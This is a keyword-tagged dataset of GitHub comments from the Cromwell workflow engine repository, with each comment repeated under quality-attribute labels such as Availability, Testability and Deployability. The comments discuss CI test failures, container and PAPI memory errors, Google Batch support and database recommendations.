https://github.com/broadinstitute/cromwell/pull/7179#issuecomment-1641077440:549,Availability,Error,Error,549,"Note to self, the test `drs_usa_jdr_preresolve` failed with log output; ```; 2023/07/18 20:58:44 Starting container setup.; 2023/07/18 20:58:46 Done container setup.; 2023/07/18 20:58:49 Starting localization.; 2023/07/18 20:59:06 Localization script execution started...; 2023/07/18 20:59:06 Localizing input gs://cloud-cromwell-dev-self-cleaning/cromwell_execution/ci/drs_usa_jdr/4f16ae4f-05d4-4bea-9f13-831c2d1ac006/call-skip_localize_jdr_drs_with_usa/script -> /cromwell_root/script; 2023/07/18 20:59:12 Localization script execution complete.; Error response from daemon: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: exec: ""-m"": executable file not found in $PATH: unknown; ```. `gs://cloud-cromwell-dev-self-cleaning/cromwell_execution/ci/drs_usa_jdr/4f16ae4f-05d4-4bea-9f13-831c2d1ac006/call-skip_localize_jdr_drs_with_usa/skip_localize_jdr_drs_with_usa.log`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7179#issuecomment-1641077440
https://github.com/broadinstitute/cromwell/pull/7179#issuecomment-1641077440:18,Testability,test,test,18,"Note to self, the test `drs_usa_jdr_preresolve` failed with log output; ```; 2023/07/18 20:58:44 Starting container setup.; 2023/07/18 20:58:46 Done container setup.; 2023/07/18 20:58:49 Starting localization.; 2023/07/18 20:59:06 Localization script execution started...; 2023/07/18 20:59:06 Localizing input gs://cloud-cromwell-dev-self-cleaning/cromwell_execution/ci/drs_usa_jdr/4f16ae4f-05d4-4bea-9f13-831c2d1ac006/call-skip_localize_jdr_drs_with_usa/script -> /cromwell_root/script; 2023/07/18 20:59:12 Localization script execution complete.; Error response from daemon: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: exec: ""-m"": executable file not found in $PATH: unknown; ```. `gs://cloud-cromwell-dev-self-cleaning/cromwell_execution/ci/drs_usa_jdr/4f16ae4f-05d4-4bea-9f13-831c2d1ac006/call-skip_localize_jdr_drs_with_usa/skip_localize_jdr_drs_with_usa.log`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7179#issuecomment-1641077440
https://github.com/broadinstitute/cromwell/pull/7179#issuecomment-1641077440:60,Testability,log,log,60,"Note to self, the test `drs_usa_jdr_preresolve` failed with log output; ```; 2023/07/18 20:58:44 Starting container setup.; 2023/07/18 20:58:46 Done container setup.; 2023/07/18 20:58:49 Starting localization.; 2023/07/18 20:59:06 Localization script execution started...; 2023/07/18 20:59:06 Localizing input gs://cloud-cromwell-dev-self-cleaning/cromwell_execution/ci/drs_usa_jdr/4f16ae4f-05d4-4bea-9f13-831c2d1ac006/call-skip_localize_jdr_drs_with_usa/script -> /cromwell_root/script; 2023/07/18 20:59:12 Localization script execution complete.; Error response from daemon: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: exec: ""-m"": executable file not found in $PATH: unknown; ```. `gs://cloud-cromwell-dev-self-cleaning/cromwell_execution/ci/drs_usa_jdr/4f16ae4f-05d4-4bea-9f13-831c2d1ac006/call-skip_localize_jdr_drs_with_usa/skip_localize_jdr_drs_with_usa.log`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7179#issuecomment-1641077440
https://github.com/broadinstitute/cromwell/pull/7179#issuecomment-1641077440:926,Testability,log,log,926,"Note to self, the test `drs_usa_jdr_preresolve` failed with log output; ```; 2023/07/18 20:58:44 Starting container setup.; 2023/07/18 20:58:46 Done container setup.; 2023/07/18 20:58:49 Starting localization.; 2023/07/18 20:59:06 Localization script execution started...; 2023/07/18 20:59:06 Localizing input gs://cloud-cromwell-dev-self-cleaning/cromwell_execution/ci/drs_usa_jdr/4f16ae4f-05d4-4bea-9f13-831c2d1ac006/call-skip_localize_jdr_drs_with_usa/script -> /cromwell_root/script; 2023/07/18 20:59:12 Localization script execution complete.; Error response from daemon: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: exec: ""-m"": executable file not found in $PATH: unknown; ```. `gs://cloud-cromwell-dev-self-cleaning/cromwell_execution/ci/drs_usa_jdr/4f16ae4f-05d4-4bea-9f13-831c2d1ac006/call-skip_localize_jdr_drs_with_usa/skip_localize_jdr_drs_with_usa.log`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7179#issuecomment-1641077440
https://github.com/broadinstitute/cromwell/pull/7182#issuecomment-1644482101:36,Testability,test,testing,36,"Closing the branch, purely made for testing Workflow actions",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7182#issuecomment-1644482101
https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1644504893:97,Availability,redundant,redundant,97,I just merged https://github.com/broadinstitute/cromwell/pull/7179 so I think this PR has become redundant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1644504893
https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1644504893:97,Safety,redund,redundant,97,I just merged https://github.com/broadinstitute/cromwell/pull/7179 so I think this PR has become redundant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1644504893
https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1645438301:15,Safety,redund,redundancy,15,Closing due to redundancy,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1645438301
https://github.com/broadinstitute/cromwell/pull/7184#issuecomment-1645659581:13,Testability,test,test,13,Reopening to test action,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7184#issuecomment-1645659581
https://github.com/broadinstitute/cromwell/pull/7184#issuecomment-1645710912:11,Testability,test,test,11,Closing to test grep parsing on re-open,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7184#issuecomment-1645710912
https://github.com/broadinstitute/cromwell/pull/7184#issuecomment-1645713821:11,Testability,test,test,11,Opening to test parsing on re-open,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7184#issuecomment-1645713821
https://github.com/broadinstitute/cromwell/pull/7186#issuecomment-1650661033:39,Availability,Failure,Failures,39,"Net improvement to tests 👍 will merge. Failures are known entities, `Application Default Credentials are not available` and `cromwell-drs-localizer`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7186#issuecomment-1650661033
https://github.com/broadinstitute/cromwell/pull/7186#issuecomment-1650661033:109,Availability,avail,available,109,"Net improvement to tests 👍 will merge. Failures are known entities, `Application Default Credentials are not available` and `cromwell-drs-localizer`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7186#issuecomment-1650661033
https://github.com/broadinstitute/cromwell/pull/7186#issuecomment-1650661033:19,Testability,test,tests,19,"Net improvement to tests 👍 will merge. Failures are known entities, `Application Default Credentials are not available` and `cromwell-drs-localizer`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7186#issuecomment-1650661033
https://github.com/broadinstitute/cromwell/issues/7194#issuecomment-1672100650:14,Testability,test,testing,14,"After further testing, I now think the actual issue is the `defined()` built-in function [does not match the spec](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#boolean-definedx). I'm inclined to think this is a bug, because if Cromwell is intended to deviate from the spec, then womtool should pick up on it. https://github.com/broadinstitute/cromwell/issues/7201",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7194#issuecomment-1672100650
https://github.com/broadinstitute/cromwell/pull/7196#issuecomment-1670017095:126,Testability,test,test,126,"FYI we have a [known plan](https://github.com/broadinstitute/cromwell/pull/7197) for the ""Centaur Local with PostgreSQL 11.3"" test, you could go ahead and cherry-pick that commit if you want.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7196#issuecomment-1670017095
https://github.com/broadinstitute/cromwell/pull/7204#issuecomment-1682857944:20,Testability,test,tests,20,"> Love having these tests working!. Give yourself a pat on the back, your walkthrough of where the CI creds are directly inspired it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7204#issuecomment-1682857944
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:292,Availability,error,error,292,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:500,Availability,error,errors,500,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:1097,Availability,error,error,1097,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:1407,Availability,error,error,1407,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:957,Deployability,pipeline,pipelines,957,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:1013,Deployability,pipeline,pipelines,1013,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:1030,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,1030,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:1193,Deployability,pipeline,pipelines,1193,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:1249,Deployability,pipeline,pipelines,1249,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:200,Testability,log,logs,200,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972:682,Testability,log,logic,682,"@doron-st TL;DR: Can you try again?. ---. While debugging this issue it just suddenly started working again... 🤷. Using old runs, it seems to be that for a few days this was appearing in the cromwell logs when a job ran out of memory:. > The job was stopped before the command finished. PAPI error code 9. Execution failed: generic::failed_precondition: while running ""/cromwell_root/script"": unexpected exit status 137 was not ignored. But PAPI (Google's LifeSciences API) _should_ ignore container errors. I have no clue who reported and fixed the issue, but thanks all from afar. The `Failed` lifesciences jobs triggered a very different code path in Cromwell. The [memory retry logic here](https://github.com/broadinstitute/cromwell/blob/85/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1312-L1323) runs only when [PAPI returns `Success`](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L735-L737) when no error is [reported](https://github.com/broadinstitute/cromwell/blob/85/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/request/GetRequestHandler.scala#L95-L96) by the lifesciences API. Anyway, I'm just glad the Google LifeSciences API isn't returning this error anymore, and I hope it stays that way until I can switch our lab's cromwell over to the Google Batch API 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-1712344972
https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-2161250684:159,Modifiability,config,config,159,"Hi,. We're trying to make this work for us. We can not get it to do so. You provide your .wdl and .json files, what is the .conf file you used to get Cromwell config setup correctly?; Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-2161250684
https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228:60,Deployability,release,release,60,"Support for Batch will be added in the upcoming Cromwell 86 release. If you'd like test it in advance of the official release, you can access development branch builds of Cromwell 86 at `broadinstitute/cromwell:86-<short git hash from develop>`, for example `broadinstitute/cromwell:86-aea7343`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228
https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228:118,Deployability,release,release,118,"Support for Batch will be added in the upcoming Cromwell 86 release. If you'd like test it in advance of the official release, you can access development branch builds of Cromwell 86 at `broadinstitute/cromwell:86-<short git hash from develop>`, for example `broadinstitute/cromwell:86-aea7343`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228
https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228:135,Security,access,access,135,"Support for Batch will be added in the upcoming Cromwell 86 release. If you'd like test it in advance of the official release, you can access development branch builds of Cromwell 86 at `broadinstitute/cromwell:86-<short git hash from develop>`, for example `broadinstitute/cromwell:86-aea7343`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228
https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228:225,Security,hash,hash,225,"Support for Batch will be added in the upcoming Cromwell 86 release. If you'd like test it in advance of the official release, you can access development branch builds of Cromwell 86 at `broadinstitute/cromwell:86-<short git hash from develop>`, for example `broadinstitute/cromwell:86-aea7343`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228
https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228:83,Testability,test,test,83,"Support for Batch will be added in the upcoming Cromwell 86 release. If you'd like test it in advance of the official release, you can access development branch builds of Cromwell 86 at `broadinstitute/cromwell:86-<short git hash from develop>`, for example `broadinstitute/cromwell:86-aea7343`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228
https://github.com/broadinstitute/cromwell/issues/7217#issuecomment-1717897693:60,Performance,perform,performing,60,"Per prior user feedback,; > [HSQLDB has got to be the worst performing embedded database designed in the history of mankind.](https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757). and we do not recommend it, like, at all, unless your use case is tiny. Likewise, `run` mode is; > [Appropriate for prototyping or demo use on a user's local machine. Features are limited and the web API is not supported.](https://cromwell.readthedocs.io/en/stable/Modes/). For real workflows – certainly anything running more than 1 hour – the path is `server` mode with a daemon-type relational DB like PostgreSQL or MySQL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7217#issuecomment-1717897693
